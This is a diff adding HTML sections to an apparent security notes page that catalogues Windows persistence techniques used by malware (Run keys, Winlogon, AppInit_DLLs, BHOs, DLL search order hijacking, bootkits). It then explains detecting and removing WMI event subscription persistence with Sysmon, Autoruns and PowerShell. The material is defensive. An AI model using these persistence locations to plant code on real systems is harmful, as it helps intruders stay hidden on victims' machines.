+    <pre>HKEY_CLASSES_ROOT\textfile\shell\open\command</pre>
+
+    <h3>DLL Search Order Hijacking</h3>
+    <p>Malware can hijack the DLL search order to load a malicious DLL before a legitimate one. The OS checks for DLLs in a specific order, which malware can exploit by placing its DLL in an earlier directory. The KnownDLLs registry key is one of the places the OS checks first:</p>
+    <pre>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs</pre>
+    <p>Malware can place its DLL in one of the search directories, bypassing the legitimate DLL.</p>
+
+    <h3>Shortcut Hijacking</h3>
+    <p>Malware can hijack shortcut icons by modifying their Target attribute, causing them to download malicious content when the shortcut is executed.</p>
+
+    <h3>Other Persistence Methods</h3>
+    <p>Aside from registry key modifications, malware can also achieve persistence by infecting the Master Boot Record (MBR), hijacking COM objects, or using other techniques to remain undetected on infected systems.</p>
+</section>
+<section id="windows-persistence-extended">
+    <h2>Windows Persistence via Registry Key Modifications (Extended)</h2>
+
+    <p>In addition to the standard registry keys, there are several other keys and techniques malware uses to maintain persistence on a Windows system. Below are additional registry locations and methods often targeted by malware:</p>
+
+    <h3>Run/RunOnce Keys</h3>
+    <p>Windows AutoStart Extension Points (ASEP) are commonly used by malware to ensure they execute during startup. At the user level, malware typically targets these registry keys:</p>
+    <ul>
+        <li>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</li>
+        <li>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</li>
+    </ul>
+
+    <p>If malware gains administrative privileges, it may also modify the following system-level keys:</p>
+    <ul>
+        <li>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</li>
+        <li>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</li>
+        <li>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</li>
+    </ul>
+
+    <h4>Update (2019/03/25)</h4>
+    <p>As pointed out by Jerry Cooke in the comments, there are additional locations that may be used for persistence:</p>
+    <ul>
+        <li>HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run</li>
+        <li>HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce</li>
+    </ul>
+    <p>These locations exist for 64-bit applications and can be overlooked by analysts. Thanks to Jerry for this valuable input!</p>
+
+    <h3>BootExecute Key</h3>
+    <p>The <code>BootExecute</code> key is used to launch processes during system startup, before the Windows subsystem fully loads. The <code>smss.exe</code> process calls the configuration subsystem to load the hive present at:</p>
+    <pre>HKLM\SYSTEM\CurrentControlSet\Control\hivelist</pre>
+    <p>Also, smss.exe will execute anything listed in the <code>BootExecute</code> key at:</p>
+    <pre>HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Control\Session Manager</pre>
+    <p>The <code>BootExecute</code> key should only contain the value <code>autocheck autochk*</code>. If additional entries are present, it may indicate malware is configured to launch at boot.</p>
+
+    <h3>Userinit Key</h3>
+    <p>The WinLogon process uses the <code>Userinit</code> key to specify login scripts and other login-related activities. This key is located at:</p>
+    <pre>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</pre>
+    <p>Typically, the <code>Userinit</code> key points to <code>userinit.exe</code>, but malware can modify this key to run its own malicious executable during login.</p>
+
+    <h3>Notify</h3>
+    <p>WinLogon also handles the Secure Attention Sequence (SAS) like <code>Ctrl+Alt+Del</code>. When SAS occurs, subkeys in the <code>Notify</code> registry key are used to load a DLL. Malware can modify these subkeys to execute its own DLL whenever SAS is triggered. These keys are located at:</p>
+    <pre>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify</pre>
+
+    <h3>Explorer.exe</h3>
+    <p>The <code>Explorer.exe</code> key, located at:</p>
+    <pre>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell</pre>
+    <p>should only contain the string <code>explorer.exe</code>. If modified, malware could cause other files to run instead of the standard Windows Explorer.</p>
+
+    <h3>Startup Keys</h3>
+    <p>Malware can place malicious files in startup locations to ensure they execute on login or system reboot. The relevant registry keys include:</p>
+    <ul>
+        <li>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</li>
+        <li>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</li>
+        <li>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</li>
+        <li>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</li>
+    </ul>
+
+    <h3>Windows Services</h3>
+    <p>Windows services such as Workstation, Server, Windows Event Log, and other drivers run during boot. Malware can use these services to load malicious files. Relevant registry keys include:</p>
+    <ul>
+        <li>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services</li>
+        <li>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\ServicesOnce</li>
+        <li>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Services</li>
+    </ul>
+    <p>Additionally, malicious files can be loaded if a service fails to start, providing another method of persistence.</p>
+
+    <h3>Browser Helper Objects (BHO)</h3>
+    <p>Browser Helper Objects (BHOs) are DLL modules loaded when Internet Explorer starts. These are commonly exploited for data theft and other malicious activities. BHOs are located at:</p>
+    <pre>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects</pre>
+    <p>Malware can modify these subkeys to instruct the browser to load malicious DLLs during startup.</p>
+
+    <h3>AppInit_DLLs</h3>
+    <p>This registry key specifies DLLs loaded by the <code>User32.dll</code> module. Since most executables load <code>User32.dll</code>, placing a malicious DLL here ensures it runs whenever a program executes. The key is located at:</p>
+    <pre>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs</pre>
+
+    <h3>File Association</h3>
+    <p>File association registry keys define how certain file types are handled. Malware can hijack these keys to ensure that its malicious file is executed instead of the intended program. These keys are located at:</p>
+    <ul>
+        <li>HKEY_LOCAL_MACHINE\Software\Classes</li>
+        <li>HKEY_CLASSES_ROOT</li>
+    </ul>
+
+    <h3>DLL Search Order Hijacking</h3>
+    <p>Malware can hijack the search order used by Windows to load DLLs. When an executable loads, the system searches specific directories for required DLLs. By placing a malicious DLL in an earlier directory in the search order, malware can execute before legitimate DLLs. The search order is as follows:</p>
+    <ul>
+        <li>The directory from which the application was launched</li>
+        <li>System Directory (e.g., C:\Windows\System32)</li>
+        <li>Windows Directory</li>
+        <li>Current Working Directory</li>
+        <li>Directories defined in the PATH variable</li>
+    </ul>
+    <p>For more information on DLL search order, visit <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms682586(v=vs.85).aspx" target="_blank">Microsoft's documentation on DLL search order</a>.</p>
+
+    <h3>Shortcut Hijacking</h3>
+    <p>Another simple yet effective technique is hijacking the shortcut icons. By modifying the <code>Target</code> attribute of a shortcut, malware can force the shortcut to download content from a malicious website.</p>
+
+    <h3>Bootkit</h3>
+    <p>A bootkit is a type of malware that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR). These malware variants reside below the operating system layer, making them difficult to detect or remove without specific remediation tools.</p>
+
+    <h3>Master Boot Record (MBR)</h3>
+    <p>The MBR is the section of the disk that is loaded first by the BIOS after hardware initialization. An attacker with raw access to the disk can overwrite this area, redirecting the boot process to adversary code, thus achieving persistence.</p>
+
+    <h3>Volume Boot Record (VBR)</h3>
+    <p>The VBR is similar to the MBR but specific to each partition on a disk. It contains code that loads the boot sector for the partition, and malware can exploit this area to ensure it runs on boot.</p>
+</section>
+<section id="remove-wmi-persistence">
+    <h2>Removing WMI Event Subscription Persistence</h2>
+    <p>Windows Management Instrumentation (WMI) Event Subscription is a popular technique that attackers use to establish persistence on an endpoint. I spent some time experimenting with Empire’s WMI modules and analyzing the artifacts for detection opportunities. Below is a review of the WMI persistence technique and how to detect and remove such threats.</p>
+    
+    <h3>What is WMI?</h3>
+    <p>WMI (Windows Management Instrumentation) is Microsoft's implementation of Web-Based Enterprise Management (WBEM). It uses the Common Information Model (CIM) standard to represent systems, applications, networks, devices, and other components within an enterprise. Attackers can exploit WMI to subscribe to specific events and execute arbitrary code when these events are triggered, thus ensuring persistence on the system.</p>
+    
+    <h3>WMI Event Subscription Overview</h3>
+    <p>WMI allows for the configuration of event filters, which define the conditions under which WMI will deliver events. Event consumers are responsible for handling these events and executing associated actions. In the case of malware, an event filter and event consumer can be used to execute malicious code when certain conditions are met, ensuring persistence.</p>
+    
+    <h3>MITRE ATT&CK Tactic</h3>
+    <p>This technique is cataloged under MITRE ATT&CK as T1084: <strong>Windows Management Instrumentation Event Subscription</strong>.</p>
+
+    <h3>Configuring Sysmon Logging</h3>
+    <p>To detect WMI abuse, you can configure Sysmon to log WMI-related activities. Sysmon can capture <code>WmiEventFilter</code>, <code>WmiEventConsumer</code>, and <code>WmiEventConsumerToFilter</code> activities, which are crucial for detecting WMI-based persistence.</p>
+    
+    <p>To configure Sysmon, use the following command to install Sysmon with a custom configuration file:</p>
+    <pre>sysmon.exe -i -c .\config_file.xml</pre>
+    
+    <h3>Sysmon Event IDs for WMI Activity</h3>
+    <p>Sysmon captures various event IDs related to WMI activities:</p>
+    <ul>
+        <li><strong>Sysmon Event ID 19</strong>: WMI Event (WmiEventFilter activity detected)</li>
+        <li><strong>Sysmon Event ID 20</strong>: WMI Event (WmiEventConsumer activity detected)</li>
+        <li><strong>Sysmon Event ID 21</strong>: WMI Event (WmiEventConsumerToFilter activity detected)</li>
+    </ul>
+
+    <h3>Establish Persistence with Empire's WMI Module</h3>
+    <p>Using Empire’s <code>Invoke-WMI</code> module, an attacker can create a permanent WMI subscription that ensures the persistence of a stager on the victim endpoint. Here is a breakdown of how Empire’s WMI-related modules function:</p>
+    
+    <ul>
+        <li><strong>Registered a WMI event filter:</strong> Defines the conditions under which the stager will execute.</li>
+        <li><strong>Registered a WMI event consumer:</strong> Contains the Base64-encoded stager, which is executed when the filter conditions are met.</li>
+        <li><strong>Bound the event consumer to the event filter:</strong> Ensures the stager runs when the filter conditions trigger the event.</li>
+    </ul>
+
+    <h3>Detection of WMI Persistence</h3>
+    <p>Sysmon logs will reveal the WMI-related activities associated with Empire's WMI module. The following Sysmon events help identify WMI persistence:</p>
+    <ul>
+        <li><strong>Sysmon Event ID 19</strong>: WmiEvent (WmiEventFilter activity detected) – Shows that a filter was registered.</li>
+        <li><strong>Sysmon Event ID 20</strong>: WmiEvent (WmiEventConsumer activity detected) – Shows the consumer containing the stager is registered.</li>
+        <li><strong>Sysmon Event ID 21</strong>: WmiEvent (WmiEventConsumerToFilter activity detected) – Indicates the consumer is bound to the filter and will execute upon triggering.</li>
+    </ul>
+    
+    <h3>Eradication: Removing WMI Event Subscriptions</h3>
+    <p>The simplest method to remove malicious WMI event subscriptions is by using a tool like <strong>Autoruns</strong>, which allows for easy inspection and removal of WMI-related entries. Here's how:</p>
+
+    <h4>Using Autoruns to Remove WMI Entries</h4>
+    <p>1. Launch <strong>Autoruns</strong> as an administrator.</p>
+    <p>2. Select the <code>WMI</code> tab to review any WMI-related persistence entries.</p>
+    <p>3. Right-click on the malicious WMI database entry and select <strong>Delete</strong> to remove it.</p>
+    
+    <h4>Using PowerShell to Remove WMI Event Subscriptions</h4>
+    <p>If you prefer to remove WMI event subscriptions from the command line, you can use PowerShell to interact with the WMI database:</p>
+    <h5>Reviewing WMI Subscriptions</h5>
+    <p>To review the WMI event filter, event consumer, and binding to the event filter, use the following PowerShell commands:</p>
+    <pre># Event Filter</pre>
+    <pre>Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='Updater'"</pre>
+    <pre># Event Consumer</pre>
+    <pre>Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer -Filter "Name='Updater'"</pre>
+    <pre># Binding</pre>
+    <pre>Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%Updater%'"</pre>
+    
+    <h5>Removing WMI Event Subscriptions</h5>
+    <p>To remove the components of the WMI persistence, use the <code>Remove-WMIObject</code> cmdlet:</p>
+    <pre># Remove Event Filter</pre>
+    <pre>Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='Updater'" | Remove-WmiObject -Verbose</pre>
+    <pre># Remove Event Consumer</pre>
+    <pre>Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer -Filter "Name='Updater'" | Remove-WmiObject -Verbose</pre>
+    <pre># Remove Binding</pre>
+    <pre>Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%Updater%'" | Remove-WmiObject -Verbose</pre>
+    
+    <h4>Verification</h4>
+    <p>Once the WMI event subscriptions have been removed, run <strong>Autoruns</strong> again to verify that the persistence mechanism has been eradicated from the system.</p>
+
+</section>
+
+
+
+</body>
+</html>
